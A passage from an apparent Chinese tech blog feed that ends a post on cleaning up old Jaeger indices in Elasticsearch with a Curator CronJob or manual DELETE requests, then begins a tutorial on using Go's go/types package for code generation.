&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">metadata&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">curator-config&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">namespace&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">jaeger&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">data&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">curator.yml&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="sd">
&lt;/span>&lt;span class="sd"> client:
&lt;/span>&lt;span class="sd"> hosts:
&lt;/span>&lt;span class="sd"> - ****
&lt;/span>&lt;span class="sd"> - ****
&lt;/span>&lt;span class="sd"> - ****
&lt;/span>&lt;span class="sd"> port: 9200
&lt;/span>&lt;span class="sd"> username: ***censored***
&lt;/span>&lt;span class="sd"> password: ***censored***
&lt;/span>&lt;span class="sd"> logging:
&lt;/span>&lt;span class="sd"> loglevel: INFO
&lt;/span>&lt;span class="sd"> logformat: default&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">action.yml&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="sd">
&lt;/span>&lt;span class="sd"> actions:
&lt;/span>&lt;span class="sd"> 1:
&lt;/span>&lt;span class="sd"> action: delete_indices
&lt;/span>&lt;span class="sd"> description: &amp;gt;-
&lt;/span>&lt;span class="sd"> delete old jaeger-span indices
&lt;/span>&lt;span class="sd"> options:
&lt;/span>&lt;span class="sd"> ignore_empty_list: True
&lt;/span>&lt;span class="sd"> timeout_override:
&lt;/span>&lt;span class="sd"> continue_if_exception: True
&lt;/span>&lt;span class="sd"> disable_action: False
&lt;/span>&lt;span class="sd"> filters:
&lt;/span>&lt;span class="sd"> - filtertype: pattern
&lt;/span>&lt;span class="sd"> kind: prefix
&lt;/span>&lt;span class="sd"> value: jaeger-span
&lt;/span>&lt;span class="sd"> exclude:
&lt;/span>&lt;span class="sd"> - filtertype: age
&lt;/span>&lt;span class="sd"> source: name
&lt;/span>&lt;span class="sd"> direction: older
&lt;/span>&lt;span class="sd"> timestring: &amp;#39;%Y-%m-%d&amp;#39;
&lt;/span>&lt;span class="sd"> unit: days
&lt;/span>&lt;span class="sd"> unit_count: 7
&lt;/span>&lt;span class="sd"> exclude:
&lt;/span>&lt;span class="sd"> 2:
&lt;/span>&lt;span class="sd"> action: delete_indices
&lt;/span>&lt;span class="sd"> description: &amp;gt;-
&lt;/span>&lt;span class="sd"> delete old jaeger-service indices
&lt;/span>&lt;span class="sd"> options:
&lt;/span>&lt;span class="sd"> ignore_empty_list: True
&lt;/span>&lt;span class="sd"> timeout_override:
&lt;/span>&lt;span class="sd"> continue_if_exception: True
&lt;/span>&lt;span class="sd"> disable_action: False
&lt;/span>&lt;span class="sd"> filters:
&lt;/span>&lt;span class="sd"> - filtertype: pattern
&lt;/span>&lt;span class="sd"> kind: prefix
&lt;/span>&lt;span class="sd"> value: jaeger-service
&lt;/span>&lt;span class="sd"> exclude:
&lt;/span>&lt;span class="sd"> - filtertype: age
&lt;/span>&lt;span class="sd"> source: name
&lt;/span>&lt;span class="sd"> direction: older
&lt;/span>&lt;span class="sd"> timestring: &amp;#39;%Y-%m-%d&amp;#39;
&lt;/span>&lt;span class="sd"> unit: days
&lt;/span>&lt;span class="sd"> unit_count: 7
&lt;/span>&lt;span class="sd"> exclude:&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>再编写一个 CronJob&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">apiVersion&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">batch/v1beta1&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">kind&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">CronJob&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">metadata&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">jaeger-es-index-cleanup&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">namespace&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">jaeger&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">spec&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">schedule&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;0 0 * * 0&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">jobTemplate&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">spec&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">template&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">spec&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">volumes&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">curator-config&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">configMap&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">curator-config&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">containers&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">image&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">bitnami/elasticsearch-curator:5.8.4&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">elasticsearch-curator&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">command&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">sh&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- -&lt;span class="l">c&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">curator --config /cfg/curator.yml /cfg/action.yml&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">volumeMounts&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">mountPath&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">/cfg&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">curator-config&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">resources&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">requests&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">cpu&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">100m&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">memory&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">100Mi&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">limits&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">cpu&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">100m&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">memory&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">100Mi&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">restartPolicy&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Never&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这里用了 &lt;code>bitnami/elasticsearch-curator&lt;/code> 镜像，如果不信任的话可以自己写个 Dockerfile 也不会很麻烦。我主要看中 bitnami 镜像大小优化还不错（98M），要是我自己随便写一个的话可能就不止这么大了。看了眼镜像的 Dockerfile 没有什么可疑的地方就直接用啦。&lt;/p>
&lt;p>对于需要立刻跑一次的情况，可以把 jobTemplate 下面的内容复制出来单独写个 Job 先跑起来。&lt;/p>
&lt;h3 id="手动">手动&lt;/h3>
&lt;p>手动法我说个思路。首先你得有个 kibana console 可以访问，或者能直接请求到 es 的 9200 端口。&lt;/p>
&lt;p>&lt;code>GET /_cat/indices&lt;/code> 拿到 indices 列表，按名字正则过滤 &lt;code>jaeger-(span|service)-\d{4}-\d{2}-\d{2}&lt;/code>，然后把后面的日期解析一下；或者粗暴点，直接&lt;code>^(2022-04-\d{2})&lt;/code>过滤出本月（4月）以外的所有索引，拿到一个索引列表。&lt;/p>
&lt;p>具体点说，像是 kibana console 拿到的是一个每行格式如 &lt;code>green open jaeger-span-2022-03-01 ....&lt;/code> 这样的纯文本，你可以放到 vscode 里然后用 &lt;code>Filter Lines&lt;/code> 这样的插件快速正则过滤出来，再按 &lt;code>alt+shift+方向键&lt;/code> 多光标，快速编辑出一个索引名称列表。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/jaeger-with-es-backend-exceeded-maximum-shards-open/image-20220413154700392.png"
width="1338"
height="315"
srcset="https://nnnewb.github.io/blog/blog/p/jaeger-with-es-backend-exceeded-maximum-shards-open/image-20220413154700392_huedcedc0cd6515fa937cef755447c928f_26312_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/jaeger-with-es-backend-exceeded-maximum-shards-open/image-20220413154700392_huedcedc0cd6515fa937cef755447c928f_26312_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="kibana"
class="gallery-image"
data-flex-grow="424"
data-flex-basis="1019px"
>&lt;/p>
&lt;p>然后把索引名前面加上 &lt;code>DELETE /&lt;/code>，产生 &lt;code>DELETE /jaeger-span-2022-03-01&lt;/code> 这样的列表，贴到 kibana console 里，全选运行，done。&lt;/p>
&lt;p>要是没 kibana ，只有 9200 访问，就改成 curl 请求，或者 httpie ，反正总有办法。最后批量执行就好。&lt;/p>
&lt;p>要是都没有，讲道理啊你跟负责人说下要个访问权限好吧&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>要是对自己的脚本编程能力有自信的话，大可直接写个 bash 脚本定时跑，也是 ok 的。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>总之，&lt;code>jaeger-es-rollover&lt;/code> 配 &lt;code>jaeger-es-index-cleaner&lt;/code>；或者&lt;code>elasticsearch-curator&lt;/code>都行。手动法无非是手工拿到 indices 然后用各种编辑器批量编辑技巧或者正则替换，拼出个脚本。正则表达式当真是每个开发者的必备良药。&lt;/p>
&lt;p>讲道理地说要不是 jaeger 给我整这一出我可能还想不到拿 es 当 jaeger 后端还会有这种坑。但这也算给我提了个醒，挂在 es 上的数据虽然不多而且都是从 MySQL 同步过去的，es 的一些基本配置如分片啥的还是得关注一下，不能只顾着接 api。这就是所谓的 &lt;em>运维压力&lt;/em> 了吧。&lt;/p>
&lt;p>应该还有不少小公司的开发其实是缺乏能力运维诸如 es 这样的项目的，对 MySQL 也是仅限于精通 &lt;strong>安装和使用&lt;/strong> ，但问起怎么怎么高可用，怎么做主备，怎么做读写分离，怎么分库分表，其实一个也不会（对，我也差不多）。&lt;/p>
&lt;p>k8s 也是个很大的坑，现在甚至有点感觉后端一路走下来真正坑人的都是这些大框架，大概念，比如前段时间流行过的&lt;strong>中台&lt;/strong>，风口上的&lt;strong>云计算&lt;/strong>、&lt;strong>云原生&lt;/strong>，好像沾个&lt;strong>云&lt;/strong>就牛逼起来了。我不是说 k8s 没用嗷，我是说媒体吹的时候个个都是银弹，老板吹的时候各个都是&lt;strong>给我也整一个！&lt;/strong>&lt;/p>
&lt;p>还好压力最后都转化成了见鬼的需求和莫名其妙的技术选型，最底层的开发只要放弃思考就完事了，写什么代码不是写，大家都是给资本服务嘛。&lt;/p></description></item><item><title>codegen 利器 go/types</title><link>https://nnnewb.github.io/blog/p/gotypes-for-codegen/</link><pubDate>Mon, 11 Apr 2022 13:00:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/gotypes-for-codegen/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>本篇博客主要想介绍下 &lt;code>go/types&lt;/code> 这个包。&lt;/p>
&lt;p>目前关于 go 代码生成比较常见的是利用 &lt;code>go/ast&lt;/code> ，结合 &lt;code>text/template&lt;/code> 生成代码。这种生成方式显然是有局限性的：&lt;code>go/ast&lt;/code> 这个包只能拿到语法树结构，但没有类型信息。比如 &lt;code>var ctx context.Context&lt;/code> 可以解析成语法树节点 &lt;code>ast.GenDecl&lt;/code>，但&lt;code>context.Context&lt;/code> 只能解析出 &lt;code>ast.SelectorExpr&lt;/code>，并不知道 &lt;code>context.Context&lt;/code> 是一个 &lt;code>struct&lt;/code>、&lt;code>interface&lt;/code>还是&lt;code>alias&lt;/code>。&lt;/p>
&lt;p>在面对简单的代码生成时&lt;code>go/ast&lt;/code>还能顶一下，但更复杂一点的需求，比如说根据 &lt;code>struct&lt;/code> 生成 &lt;code>thrift&lt;/code> 或者 &lt;code>protobuf&lt;/code> 定义，&lt;code>go/ast&lt;/code> 就有点吃力不讨好了。&lt;/p>
&lt;h2 id="入门">入门&lt;/h2>
&lt;p>注意这块没照搬官方的 example，因为官方的 example 主要注重在怎么用 &lt;code>go/types&lt;/code> 做类型检查，关注 &lt;code>types.Config&lt;/code> 和 &lt;code>types.Checker&lt;/code>，但我不是很想管 &lt;code>checker&lt;/code> 怎么样，我们的目的是写个 codegen，想办法拿到更丰富的类型信息。&lt;/p>
&lt;p>因此 &lt;code>go/types&lt;/code> 的使用更关注的是其中的数据结构。&lt;/p>
&lt;h3 id="类型系统">类型系统&lt;/h3>
&lt;p>先来个基本的例子。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kn">package&lt;/span> &lt;span class="nx">main&lt;/span>
&lt;span class="kn">import&lt;/span> &lt;span class="p">(&lt;/span>
&lt;span class="s">&amp;#34;flag&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;go/importer&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;go/token&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;go/types&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;log&amp;#34;&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kd">var&lt;/span> &lt;span class="nx">pkgPath&lt;/span> &lt;span class="kt">string&lt;/span>
&lt;span class="kd">var&lt;/span> &lt;span class="nx">typ&lt;/span> &lt;span class="kt">string&lt;/span>
&lt;span class="nx">flag&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">StringVar&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">pkgPath&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;package&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;package path&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">flag&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">StringVar&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">typ&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;type&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;type name&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">flag&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Parse&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">pkgPath&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s">&amp;#34;&amp;#34;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;-package is required&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">flag&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Usage&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">typ&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s">&amp;#34;&amp;#34;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;-type is required&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">flag&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Usage&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">fst&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">token&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewFileSet&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="nx">imp&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">importer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ForCompiler&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">fst&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;source&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">pkg&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">imp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Import&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">pkgPath&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Fatal&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">typename&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">pkg&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Scope&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nf">Lookup&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">typ&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">typename&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Fatalf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;type %s not found&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">typ&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">named&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">ok&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">typename&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Type&lt;/span>&lt;span class="p">().(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nx">types&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Named&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="nx">ok&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">switch&lt;/span> &lt;span class="nx">named&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Underlying&lt;/span>&lt;span class="p">().(&lt;/span>&lt;span class="kd">type&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">types&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Basic&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nb">println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;primitive type&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">types&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Interface&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nb">println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;interface type&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">types&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Struct&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nb">println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;struct type&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">default&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">named&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Obj&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nf">IsAlias&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">println&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;is alias type&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;%v&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">named&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>很短，注意几个新出现的包和API：&lt;code>go/importer&lt;/code>、&lt;code>go/types&lt;/code>。&lt;/p>
&lt;p>&lt;code>go/importer&lt;/code>顾名思义是一个管理&lt;code>import&lt;/code>功能的包，go 不是 python 这样解释执行或 Java 那样可以热加载代码的模型，&lt;code>importer&lt;/code>基本是编译期才会用到。我们用&lt;code>importer.ForCompiler&lt;/code>的目的是构造一个 &lt;code>Importer&lt;/code>， &lt;strong>从源代码&lt;/strong> 拿到类型信息。&lt;/p>
&lt;p>从&lt;code>Import&lt;/code>调用拿到一个 &lt;code>*types.Package&lt;/code> 类型的返回值后，又使用 &lt;code>Scope().Lookup()&lt;/code>从这个包作用域下查找指定的类型——这里提一嘴，&lt;code>type xxx struct{}&lt;/code>这样的语句可以是块作用域的，&lt;code>Scope().Lookup()&lt;/code>查找的是 &lt;strong>包内的全局类型定义&lt;/strong> ，查找结果是一个 &lt;code>types.Object&lt;/code>，可以理解成一个有类型的对象——比如全局 &lt;code>var v int&lt;/code> 这样声明的 &lt;code>v&lt;/code>。对于查找的是类型的情况，需要关注的就是 &lt;code>.Type()&lt;/code>这个方法了。&lt;/p>
&lt;p>顾名思义&lt;code>.Type()&lt;/code>返回对象的类型，代码里的 type switch 应该很好地展示了整个过程。&lt;/p>
&lt;p>另外还要注意到 &lt;code>.(*types.Named)&lt;/code>，这里涉及一个 &lt;code>named type&lt;/code>概念。所谓的 &lt;code>Named&lt;/code> 在 &lt;a class="link" href="https://go.dev/ref/spec#Types" target="_blank" rel="noopener"
>Go Specification 里是这样解释的&lt;/a>：&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>Predeclared types&lt;/strong>, &lt;strong>defined types&lt;/strong>, and &lt;strong>type parameters&lt;/strong> are called &lt;em>named types&lt;/em>. An alias denotes a named type if the type given in the alias declaration is a named type.&lt;/p>
&lt;/blockquote>
&lt;p>什么意思呢？&lt;code>predeclared types&lt;/code> 指的是内置的类型，如 &lt;code>int&lt;/code>、&lt;code>byte&lt;/code>、&lt;code>rune&lt;/code>，参考链接 &lt;a class="link" href="https://go.dev/ref/spec#Predeclared_identifiers" target="_blank" rel="noopener"
>predeclares&lt;/a> 。而 &lt;code>defined types&lt;/code> 指的是形如 &lt;code>type Sample struct {}&lt;/code> 的类型定义，&lt;code>type parameters&lt;/code> 则是 go 1.18 引入的泛型语法，例如 &lt;code>type Sample[T any] struct {t T}&lt;/code> ，其中的&lt;code>T&lt;/code>也是 &lt;code>named type&lt;/code>。&lt;/p>
&lt;p>那什么样的不是 &lt;code>named type&lt;/code>呢？比如&lt;code>type Sample = struct {}&lt;/code>，这里的 &lt;code>Sample&lt;/code> 就不是 &lt;code>named type&lt;/code>。注意前面引文的后半句：&lt;/p>
&lt;blockquote>
&lt;p>An alias denotes a named type if the type given in the alias declaration is a named type.&lt;/p>
&lt;/blockquote>
&lt;p>只有&lt;code>named type&lt;/code>的别名才被视为&lt;code>named type&lt;/code>，所以 &lt;code>type Sample = int&lt;/code> 是 &lt;code>named type&lt;/code>，但 &lt;code>type Sample = struct{}&lt;/code> 或者 &lt;code>type Sample = map[string]string&lt;/code> 都不是 &lt;code>named type&lt;/code>。&lt;/p>
&lt;p>好了，绕晕了就可以继续下一阶段了，开始了解 &lt;code>Field&lt;/code> 和 &lt;code>Method&lt;/code>。&lt;/p>
&lt;h3 id="field">Field&lt;/h3>
&lt;p>我们稍微改一下上面的代码，在 &lt;code>case *types.Struct&lt;/code> 下加入几行循环。记得 &lt;code>switch&lt;/code>也改成&lt;code>switch tp := named.Underlying().(type)&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="k">for&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="p">&amp;lt;&lt;/span> &lt;span class="nx">tp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NumFields&lt;/span>&lt;span class="p">();&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">field&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">tp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Field&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">)&lt;/span>
